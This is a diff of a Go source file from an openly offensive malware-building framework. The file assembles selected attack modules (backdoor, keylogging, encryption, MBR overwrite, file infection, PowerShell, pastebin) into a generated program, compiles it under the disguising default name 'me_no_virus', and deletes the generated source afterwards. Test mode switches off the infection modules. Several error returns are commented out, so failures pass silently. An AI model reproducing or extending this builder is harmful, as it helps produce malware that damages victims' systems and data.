@@ -12,29 +12,29 @@ import (
 	"runtime"
 	"strings"
 
-	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
+	mal "github.com/s9rA16Bf4/go-evil/domains/malware"
+	"github.com/s9rA16Bf4/go-evil/utility/json"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
 	"gopkg.in/go-rillas/subprocess.v1"
 )
 
 var debug bool = false // If this is true, then we will save the go-file that we compile
 var test_mode string   // Will make the for loop run once, independant if an exit statement exists
-var domains []string
 
 const (
-	sys            = "\tsys \"github.com/s9rA16Bf4/go-evil/domains/system/private\""
-	win            = "\twin \"github.com/s9rA16Bf4/go-evil/domains/window/private\""
-	time           = "\ttime \"github.com/s9rA16Bf4/go-evil/domains/time/private\""
-	keyboard       = "\tkeyboard \"github.com/s9rA16Bf4/go-evil/domains/keyboard/private\""
-	attack_hash    = "\tattack_hash \"github.com/s9rA16Bf4/go-evil/domains/attack_vector/hash/private\""
-	attack_encrypt = "\tattack_encrypt \"github.com/s9rA16Bf4/go-evil/domains/attack_vector/encrypt/private\""
-	back           = "\tback \"github.com/s9rA16Bf4/go-evil/domains/backdoor/private\""
+	sys            = "\tsys \"github.com/s9rA16Bf4/go-evil/domains/system\""
+	win            = "\twin \"github.com/s9rA16Bf4/go-evil/domains/window\""
+	time           = "\ttime \"github.com/s9rA16Bf4/go-evil/domains/time\""
+	keyboard       = "\tkeyboard \"github.com/s9rA16Bf4/go-evil/domains/keyboard\""
+	attack_hash    = "\tattack_hash \"github.com/s9rA16Bf4/go-evil/domains/attack_vector/hash\""
+	attack_encrypt = "\tattack_encrypt \"github.com/s9rA16Bf4/go-evil/domains/attack_vector/encrypt\""
+	back           = "\tback \"github.com/s9rA16Bf4/go-evil/domains/backdoor\""
 	syscall        = "\"syscall\""
-	net            = "\tnet \"github.com/s9rA16Bf4/go-evil/domains/network/private\""
-	pwsh           = "\tpwsh \"github.com/s9rA16Bf4/go-evil/domains/powershell/private\""
-	pastebin       = "\tpastebin \"github.com/s9rA16Bf4/go-evil/domains/pastebin/private\""
-	mbr            = "\tmbr \"github.com/s9rA16Bf4/go-evil/domains/mbr/private\""
-	infect         = "\tinfect \"github.com/s9rA16Bf4/go-evil/domains/infect/private\""
+	net            = "\tnet \"github.com/s9rA16Bf4/go-evil/domains/network\""
+	pwsh           = "\tpwsh \"github.com/s9rA16Bf4/go-evil/domains/powershell\""
+	pastebin       = "\tpastebin \"github.com/s9rA16Bf4/go-evil/domains/pastebin\""
+	mbr            = "\tmbr \"github.com/s9rA16Bf4/go-evil/domains/mbr\""
+	infect         = "\tinfect \"github.com/s9rA16Bf4/go-evil/domains/infect\""
 
 	// Related to webview
 	loader_x86 = "https://github.com/webview/webview/raw/master/dll/x86/WebView2Loader.dll"
@@ -46,80 +46,69 @@ const (
 	run = "\truntime \"github.com/s9rA16Bf4/go-evil/utility/variables/runtime\""
 )
 
-func Append_domain(domain string) {
+func Append_domain(domain string, base_64_serialize_json string) string {
+	data_structure := json.Receive(base_64_serialize_json)
+	data_structure.Append_to_call("io.Append_domain()")
+
 	switch domain {
 	case "system":
-		if !find(sys) && !mal.Is_disabled("sys") {
-			notify.Log("Adding domain 'system'", notify.Verbose_lvl, "2")
-			domains = append(domains, sys)
-		}
+		notify.Log("Adding domain 'system'", data_structure.Verbose_LVL, "2")
+		data_structure.Append_imported_domain(sys)
+
 	case "window":
-		if !find(win) && !mal.Is_disabled("win") {
-			notify.Log("Adding domain 'window'", notify.Verbose_lvl, "2")
-			domains = append(domains, win)
-		}
+		notify.Log("Adding domain 'window'", data_structure.Verbose_LVL, "2")
+		data_structure.Append_imported_domain(win)
+
 	case "time":
-		if !find(time) && !mal.Is_disabled("time") {
-			notify.Log("Adding domain 'time'", notify.Verbose_lvl, "2")
-			domains = append(domains, time)
-		}
+		notify.Log("Adding domain 'time'", data_structure.Verbose_LVL, "2")
+		data_structure.Append_imported_domain(time)
 
 	case "keyboard":
-		if !find(keyboard) && !mal.Is_disabled("keyboard") {
-			notify.Log("Adding domain 'keyboard'", notify.Verbose_lvl, "2")
-			domains = append(domains, keyboard)
-		}
+		notify.Log("Adding domain 'keyboard'", data_structure.Verbose_LVL, "2")
+		data_structure.Append_imported_domain(keyboard)
+
 	case "attack_hash":
-		if !find(attack_hash) && !mal.Is_disabled("attack_hash") {
-			notify.Log("Adding domain 'attack_hash'", notify.Verbose_lvl, "2")
-			domains = append(domains, attack_hash)
-		}
+		notify.Log("Adding domain 'attack_hash'", data_structure.Verbose_LVL, "2")
+		data_structure.Append_imported_domain(attack_hash)
+
 	case "attack_encrypt":
-		if !find(attack_encrypt) && !mal.Is_disabled("attack_encrypt") {
-			notify.Log("Adding domain 'attack_encrypt'", notify.Verbose_lvl, "2")
-			domains = append(domains, attack_encrypt)
-		}
+		notify.Log("Adding domain 'attack_encrypt'", data_structure.Verbose_LVL, "2")
+		data_structure.Append_imported_domain(attack_encrypt)
+
 	case "backdoor":
-		if !find(back) && !mal.Is_disabled("backdoor") {
-			notify.Log("Adding domain 'backdoor'", notify.Verbose_lvl, "2")
-			domains = append(domains, back)
-		}
+		notify.Log("Adding domain 'backdoor'", data_structure.Verbose_LVL, "2")
+		data_structure.Append_imported_domain(back)
+
 	case "syscall":
-		if !find(syscall) && !mal.Is_disabled("syscall") {
-			notify.Log("Adding library 'syscall'", notify.Verbose_lvl, "2")
-			domains = append(domains, syscall)
-		}
+		notify.Log("Adding library 'syscall'", notify.Verbose_lvl, "2")
+		data_structure.Append_imported_domain(syscall)
+
 	case "network":
-		if !find(net) && !mal.Is_disabled("net") {
-			notify.Log("Adding library 'network'", notify.Verbose_lvl, "2")
-			domains = append(domains, net)
-		}
+		notify.Log("Adding domain 'network'", data_structure.Verbose_LVL, "2")
+		data_structure.Append_imported_domain(net)
+
 	case "powershell":
-		if !find(pwsh) && !mal.Is_disabled("pwsh") {
-			notify.Log("Adding library 'powershell'", notify.Verbose_lvl, "2")
-			domains = append(domains, pwsh)
-		}
+		notify.Log("Adding domain 'powershell'", data_structure.Verbose_LVL, "2")
+		data_structure.Append_imported_domain(pwsh)
+
 	case "pastebin":
-		if !find(pastebin) && !mal.Is_disabled("pastebin") {
-			notify.Log("Adding library 'pastebin'", notify.Verbose_lvl, "2")
-			domains = append(domains, pastebin)
-		}
+		notify.Log("Adding domain 'pastebin'", data_structure.Verbose_LVL, "2")
+		data_structure.Append_imported_domain(pastebin)
+
 	case "mbr":
-		if !find(mbr) && !mal.Is_disabled("mbr") {
-			notify.Log("Adding library 'MBR'", notify.Verbose_lvl, "2")
-			domains = append(domains, mbr)
-		}
+		notify.Log("Adding library 'MBR'", data_structure.Verbose_LVL, "2")
+		data_structure.Append_imported_domain(mbr)
+
 	case "infect":
-		if !find(infect) && !mal.Is_disabled("infect") {
-			notify.Log("Adding library 'infect'", notify.Verbose_lvl, "2")
-			domains = append(domains, infect)
-		}
+		notify.Log("Adding library 'infect'", data_structure.Verbose_LVL, "2")
+		data_structure.Append_imported_domain(infect)
+
 	case "runtime":
-		if !find(run) {
-			notify.Log("Adding library 'runtime'", notify.Verbose_lvl, "2")
-			domains = append(domains, run)
-		}
+		notify.Log("Adding library 'runtime'", data_structure.Verbose_LVL, "2")
+		data_structure.Append_imported_domain(run)
 	}
+
+	return json.Send(data_structure)
 }
 
 func Set_target_OS(new_os string) {
@@ -132,62 +121,64 @@ func Set_target_ARCH(new_arch string) {
 	os.Setenv("GOARCH", new_arch)
 }
 
-func Set_debug(new_debug bool) {
-	debug = new_debug
-}
+func Set_testMode(new_mode bool, base_64_serialize_json string) string {
+	data_structure := json.Receive(base_64_serialize_json)
+	data_structure.Append_to_call("io.Set_testMode()")
 
-func Set_testMode(new_mode bool) {
 	if new_mode {
 		test_mode = "i := 0; i < 1; i++"
-		mal.Disable_domain("win")      // Window domain
-		mal.Disable_domain("time")     // Time management domain
-		mal.Disable_domain("sys")      // System domain
-		mal.Disable_domain("back")     // Backdoor
-		mal.Disable_domain("keyboard") // Keyboard
-		mal.Disable_domain("pastebin") // pastebin
-		mal.Disable_domain("mbr")      // Master boot record
-		mal.Disable_domain("infect")   // We don't wanna infect ourself
+		data_structure = json.Receive(mal.Disable_domain("win", json.Send(data_structure)))      // Window domain
+		data_structure = json.Receive(mal.Disable_domain("time", json.Send(data_structure)))     // Time management domain
+		data_structure = json.Receive(mal.Disable_domain("sys", json.Send(data_structure)))      // System domain
+		data_structure = json.Receive(mal.Disable_domain("back", json.Send(data_structure)))     // Backdoor
+		data_structure = json.Receive(mal.Disable_domain("keyboard", json.Send(data_structure))) // Keyboard
+		data_structure = json.Receive(mal.Disable_domain("pastebin", json.Send(data_structure))) // pastebin
+		data_structure = json.Receive(mal.Disable_domain("mbr", json.Send(data_structure)))      // Master boot record
+		data_structure = json.Receive(mal.Disable_domain("infect", json.Send(data_structure)))   // We don't wanna infect ourself
 	}
+
+	return json.Send(data_structure)
 }
 
-func find(domain string) bool {
-	for _, line := range domains {
-		if domain == line {
-			return true
-		}
-	}
-	return false
-}
+func Write_file(base_64_serialize_json string) string {
+	data_structure := json.Receive(base_64_serialize_json)
+	data_structure.Append_to_call("io.Write_file()")
 
-func Write_file() {
 	base_code := []string{
 		"package main",
 		"import (",
 		"\"github.com/cloudfoundry/jibber_jabber\"",
 	}
-	base_code = append(base_code, domains...)                  // Which domains to include
-	base_code = append(base_code, ")", "func main(){")         // Main function and closing include tag
-	base_code = append(base_code, mal.Region_is_disabled()...) // Will stop the malware from running if it has been told too
-	base_code = append(base_code, "for "+test_mode+" {")       // While loop
-	base_code = append(base_code, mal.GetContent()...)         // Insert the malware code
-	base_code = append(base_code, "}}")                        // And insert the end
 
-	if mal.GetName() == "" {
-		mal.SetBinaryName("me_no_virus")
+	base_code = append(base_code, data_structure.Get_imported_domain()...) // Which domains to include
+	base_code = append(base_code, ")", "func main(){")                     // Main function and closing include tag
+
+	regions, base_64_serialize_json := mal.Region_is_disabled(json.Send(data_structure)) // Get all disabled regions
+	data_structure = json.Receive(base_64_serialize_json)
+
+	base_code = append(base_code, regions...)                          // Will stop the malware from running if it has been told too
+	base_code = append(base_code, "for "+test_mode+" {")               // While loop
+	base_code = append(base_code, data_structure.Get_malware_gut()...) // Insert the malware code
+	base_code = append(base_code, "}}")                                // And insert the end
+
+	if data_structure.Get_binary_name() == "" {
+		data_structure.Set_binary_name("me_no_virus")
 	}
 
 	file, _ := os.Create("output/temp.go") // We utilize a temp directory
 	write := bufio.NewWriter(file)
 
 	for _, line := range base_code {
-		notify.Log("Writing line '"+line+"' to the target file", notify.Verbose_lvl, "3")
+		notify.Log(fmt.Sprintf("Writing line '%s' to the target file", line), data_structure.Verbose_LVL, "3")
 		_, err := write.WriteString(line + "\n")
 		if err != nil {
 			notify.Error("Failed to write to disk", "io.write_file()")
-			return
+			//return
 		}
 	}
 	write.Flush()
+
+	return json.Send(data_structure)
 }
 
 func Read_file(file string) string {
@@ -199,14 +190,18 @@ func Read_file(file string) string {
 	return string(file_gut)
 }
 
-func Compile_file() {
-	if os.Getenv("GOOS") == "windows" && mal.GetExtension() == "" {
-		mal.SetExtension(".exe") // Apparently golang on windows doesn't do this automatically
-		notify.Log("Setting .exe extension on the target file", notify.Verbose_lvl, "3")
+func Compile_file(base_64_serialize_json string) string {
+	data_structure := json.Receive(base_64_serialize_json)
+	data_structure.Append_to_call("io.Compile_file()")
+
+	if os.Getenv("GOOS") == "windows" && data_structure.Get_Extension() == "" {
+		data_structure.Set_Extension(".exe") // Apparently golang on windows doesn't do this automatically
+		notify.Log("Setting .exe extension on the target file", data_structure.Verbose_LVL, "3")
 	}
-	arg := "build -o output/" + mal.GetName() + mal.GetExtension() + " output/temp.go"
+
+	arg := fmt.Sprintf("build -o output/%s%s output/temp.go", data_structure.Get_binary_name(), data_structure.Get_Extension())
 	cmd := exec.Command("go", strings.Split(arg, " ")...)
-	notify.Log("Compiling malware", notify.Verbose_lvl, "1")
+	notify.Log("Compiling malware", data_structure.Verbose_LVL, "1")
 
 	var out bytes.Buffer
 	var stderr bytes.Buffer
@@ -217,21 +212,23 @@ func Compile_file() {
 
 	if err != nil {
 		notify.Error(fmt.Sprint(err)+": "+stderr.String(), "io.compile_file()")
-		return
+		//return
 	}
 
 	if !debug {
-		notify.Log("Removing the temoporarly made golang file", notify.Verbose_lvl, "2")
+		notify.Log("Removing the temoporarly made golang file", data_structure.Verbose_LVL, "2")
 		arg = "output/temp.go"
 		cmd = exec.Command("rm", strings.Split(arg, " ")...)
 		err := cmd.Run()
 
 		if err != nil {
 			notify.Error(fmt.Sprint(err)+": "+stderr.String(), "io.compile_file()")
-			return
+			//return
 		}
 	}
 	create_dll() // Creates only if necessary to the somewhat required dll files (only on windows)
+
+	return json.Send(data_structure)
 }
 
 func create_dll() {
@@ -316,6 +313,7 @@ func Run_file(file_path string) string {
 	resp := subprocess.RunShell("", "", file_path)
 	return resp.StdOut
 }
+
 func Remove_file(file_path string) {
 	os.Remove(file_path)
 }
